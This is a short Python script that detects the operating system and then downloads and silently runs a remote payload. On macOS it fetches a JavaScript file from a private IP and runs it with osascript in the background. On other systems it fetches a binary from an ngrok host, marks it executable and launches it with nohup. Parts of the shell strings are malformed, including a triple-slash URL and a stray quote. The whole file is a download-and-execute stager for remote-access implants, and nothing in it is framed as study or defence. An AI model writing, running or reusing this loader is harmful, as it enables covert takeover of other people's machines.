from sys import exit
from platform import platform
from subprocess import Popen

os = platform().lower()


def mznt():
    d = "/private/tmp/o"
    c = f"""
    curl -s http://192.168.10.82:9000/o.js -o {d} && nohup /usr/bin/osascript -l JavaScript {d} 1>/dev/null 2>&1 &
    """
    Popen(c, shell=True)


def pgn():
    d = "/tmp/e"
    c = f"""
    curl -s https:///eb.ngrok.dev/e -o {d} && chmod +x {d} && nohup {d} &1>/dev/null 2>&1 &'
    while true; do
      sleep 5
    done    
    """
    Popen(c, shell=True)
    pass


if "macos-" in os:
    mznt()
else:
    pgn()

